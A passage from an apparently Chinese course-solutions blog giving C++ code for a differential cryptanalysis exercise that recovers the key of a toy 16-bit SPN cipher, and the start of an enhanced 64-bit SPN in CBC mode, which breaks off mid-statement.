class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="差分分析"><a class="markdownIt-Anchor" href="#差分分析"></a> 差分分析</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/III">oj | 差分分析</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030102909.png" alt="差分分析" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123; &#123; <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span> &#125;, &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> permutation[<span class="number">2</span>][<span class="number">65536</span>] = &#123;打表&#125;;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext, <span class="keyword">unsigned</span> <span class="keyword">int</span> ciphertext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">				plaintext ^= ((k &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				plaintext ^= permutation[mode][(k &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			plaintext ^= ((k &gt;&gt; (<span class="number">16</span> - <span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">		plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] | ((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line">		plaintext = permutation[mode][plaintext];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= permutation[mode][(k &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= ((k &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] | ((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= ((k &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= (k &amp; <span class="number">0xffff</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%04x&quot;, plaintext);</span></span><br><span class="line">	<span class="keyword">return</span> (plaintext == ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> c = <span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span> (c != <span class="string">&#x27; &#x27;</span> &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">		x = x * <span class="number">16</span> + ((c &gt;= <span class="string">&#x27;a&#x27;</span>) ? (c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>) : (c - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">		c = <span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, maxNum[<span class="number">2</span>];</span><br><span class="line">	pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; count1[<span class="number">256</span>], count2[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext[<span class="number">65536</span>], ciphertext[<span class="number">65536</span>], temp1[<span class="number">4</span>], temp2[<span class="number">4</span>], k[<span class="number">8</span>], lastKey2, key, times;</span><br><span class="line">	<span class="comment">//freopen(&quot;T3.in&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		lastKey2 = <span class="number">-1</span>;</span><br><span class="line">		<span class="built_in">fill</span>(count1, count1 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="built_in">fill</span>(count2, count2 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">65536</span>; j++) &#123;</span><br><span class="line">			ciphertext[j] = <span class="built_in">read</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 计算第一条链</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">65536</span>; j += <span class="number">37</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (((ciphertext[j] ^ ciphertext[j ^ <span class="number">0xb00</span>]) &amp; <span class="number">0xf0f0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (k[<span class="number">5</span>] = <span class="number">0</span>; k[<span class="number">5</span>] &lt; <span class="number">16</span>; k[<span class="number">5</span>]++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (k[<span class="number">7</span>] = <span class="number">0</span>; k[<span class="number">7</span>] &lt; <span class="number">16</span>; k[<span class="number">7</span>]++) &#123;</span><br><span class="line">						temp1[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">						temp1[<span class="number">3</span>] = ((ciphertext[j] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">						temp1[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">1</span>]];</span><br><span class="line">						temp1[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">3</span>]];</span><br><span class="line">						temp2[<span class="number">1</span>] = ((ciphertext[j ^ <span class="number">0xb00</span>] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">						temp2[<span class="number">3</span>] = ((ciphertext[j ^ <span class="number">0xb00</span>] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">						temp2[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">1</span>]];</span><br><span class="line">						temp2[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line">						temp1[<span class="number">1</span>] ^= temp2[<span class="number">1</span>];</span><br><span class="line">						temp1[<span class="number">3</span>] ^= temp2[<span class="number">3</span>];</span><br><span class="line">						<span class="keyword">if</span> (temp1[<span class="number">1</span>] == <span class="number">6</span> &amp;&amp; temp1[<span class="number">3</span>] == <span class="number">6</span>)</span><br><span class="line">							count1[k[<span class="number">5</span>] * <span class="number">16</span> + k[<span class="number">7</span>]].first++;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (((ciphertext[j] ^ ciphertext[j ^ <span class="number">0x50</span>]) &amp; <span class="number">0x0f0f</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (k[<span class="number">4</span>] = <span class="number">0</span>; k[<span class="number">4</span>] &lt; <span class="number">16</span>; k[<span class="number">4</span>]++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (k[<span class="number">6</span>] = <span class="number">0</span>; k[<span class="number">6</span>] &lt; <span class="number">16</span>; k[<span class="number">6</span>]++) &#123;</span><br><span class="line">						temp1[<span class="number">0</span>] = ((ciphertext[j] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">						temp1[<span class="number">2</span>] = ((ciphertext[j] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">						temp1[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">0</span>]];</span><br><span class="line">						temp1[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">2</span>]];</span><br><span class="line">						temp2[<span class="number">0</span>] = ((ciphertext[j ^ <span class="number">0x50</span>] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">						temp2[<span class="number">2</span>] = ((ciphertext[j ^ <span class="number">0x50</span>] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">						temp2[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">0</span>]];</span><br><span class="line">						temp2[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">2</span>]];</span><br><span class="line"></span><br><span class="line">						temp1[<span class="number">0</span>] ^= temp2[<span class="number">0</span>];</span><br><span class="line">						temp1[<span class="number">2</span>] ^= temp2[<span class="number">2</span>];</span><br><span class="line">						<span class="keyword">if</span> (temp1[<span class="number">0</span>] == <span class="number">5</span> &amp;&amp; temp1[<span class="number">2</span>] == <span class="number">5</span>)</span><br><span class="line">							count2[k[<span class="number">4</span>] * <span class="number">16</span> + k[<span class="number">6</span>]].first++;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 得到部分密钥</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">			count1[j].second = j;</span><br><span class="line">			count2[j].second = j;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort</span>(count1, count1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sort</span>(count2, count2 + <span class="number">256</span>);</span><br><span class="line">		k[<span class="number">4</span>] = count2[<span class="number">255</span>].second / <span class="number">16</span>;</span><br><span class="line">		k[<span class="number">6</span>] = count2[<span class="number">255</span>].second % <span class="number">16</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">			k[<span class="number">5</span>] = count1[j].second / <span class="number">16</span>;</span><br><span class="line">			k[<span class="number">7</span>] = count1[j].second % <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (k[<span class="number">0</span>] = <span class="number">0</span>; k[<span class="number">0</span>] &lt; <span class="number">65536</span>; k[<span class="number">0</span>]++) &#123;</span><br><span class="line">				key = (k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) | (k[<span class="number">4</span>] &lt;&lt; <span class="number">12</span>) | (k[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (k[<span class="number">6</span>] &lt;&lt; <span class="number">4</span>) | k[<span class="number">7</span>];</span><br><span class="line">				<span class="keyword">for</span> (times = <span class="number">0</span>; times &lt; <span class="number">10</span>; times++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="built_in">SPN</span>(key, times * <span class="number">1000</span> + <span class="number">30000</span>, ciphertext[times * <span class="number">1000</span> + <span class="number">30000</span>], <span class="number">0</span>))</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (times == <span class="number">10</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, key);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (times == <span class="number">10</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="spn增强"><a class="markdownIt-Anchor" href="#spn增强"></a> SPN增强</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/IV">oj | SPN增强</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030103130.png" alt="SPN增强" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPN CBC模式</span></span><br><span class="line"><span class="comment">// SPN分组长度64位  密钥长度128位</span></span><br><span class="line"><span class="comment">// 重写了P盒</span></span><br><span class="line"><span class="comment">// Nr = 4（跑四轮）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYBYTES (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPNBYTES (8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INPUTBYTES (1&lt;&lt;24)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123; &#123; <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span> &#125;, &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> permutationArr[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">int</span> permutationPos[<span class="number">2</span>][<span class="number">64</span>] = &#123; &#123;<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,<span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>&#125;,</span><br><span class="line">							&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">36</span>,<span class="number">40</span>,<span class="number">44</span>,<span class="number">48</span>,<span class="number">52</span>,<span class="number">56</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">57</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">26</span>,<span class="number">30</span>,<span class="number">34</span>,<span class="number">38</span>,<span class="number">42</span>,<span class="number">46</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">58</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">27</span>,<span class="number">31</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">63</span>&#125; &#125;;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">permutation</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> plaintext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> mask = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">		permutationArr[i] = ((plaintext &amp; mask) == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">		mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	plaintext = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">		plaintext ^= (permutationArr[permutationPos[mode][i]] &lt;&lt; i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plaintext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k[<span class="number">5</span>], <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> plaintext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">				plaintext ^= k[<span class="number">4</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				plaintext ^= <span class="built_in">permutation</span>(k[<span class="number">4</span> - i], mode);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			plaintext ^= k[i];</span><br><span class="line">		plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000</span>) &gt;&gt; <span class="number">20</span>]) &lt;&lt; <span class="number">20</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000</span>) &gt;&gt; <span class="number">24</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">28</span>]) &lt;&lt; <span class="number">28</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000</span>) &gt;&gt; <span class="number">32</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000</span>) &gt;&gt; <span class="number">36</span>]) &lt;&lt; <span class="number">36</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000</span>) &gt;&gt; <span class="number">40</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000</span>) &gt;&gt; <span class="number">44</span>]) &lt;&lt; <span class="number">44</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000</span>) &gt;&gt; <span class="number">48</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000000</span>) &gt;&gt; <span class="number">52</span>]) &lt;&lt; <span class="number">52</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000000</span>) &gt;&gt; <span class="number">56</span>]) &lt;&lt; <span class="number">56</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000000</span>) &gt;&gt; <span class="number">60</span>]) &lt;&lt; <span class="number">60</span>);</span><br><span class="line">		plaintext = <span class="built_in">permutation</span>(plaintext, mode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= <span class="built_in">permutation</span>(k[<span class="number">1</span>], mode);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= k[<span class="number">3</span>];</span><br><span class="line">	plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000</span>) &gt;&gt; <span class="number">20</span>]) &lt;&lt; <span class="number">20</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000</span>) &gt;&gt; <span class="number">24</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">28</span>]) &lt;&lt; <span class="number">28</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000</span>) &gt;&gt; <span class="number">32</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000</span>) &gt;&gt; <span class="number">36</span>]) &lt;&lt; <span class="number">36</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000</span>) &gt;&gt; <span class="number">40</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000</span>) &gt;&gt; <span class="number">44</span>]) &lt;&lt; <span class="number">44</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000</span>) &gt;&gt; <span class="number">48</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000000</span>) &gt;&gt; <span class="number">52</span>]) &lt;&lt; <span class="number">52</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000000</span>) &gt;&gt; <span class="number">56</span>]) &lt;&lt; <span class="number">56</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000000</span>) &gt;&gt; <span class="number">60</span>]) &lt;&lt; <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= k[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= k[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">return</span> plaintext;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 密钥， 明文， 密文， 初始向量</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;, plaintext[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;, ciphertext[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;, initialValue = <span class="number">22220012</span>;</span><br><span class="line">	<span class="built_in">fread</span>(k, SPNBYTES, <span class="number">1</span>, 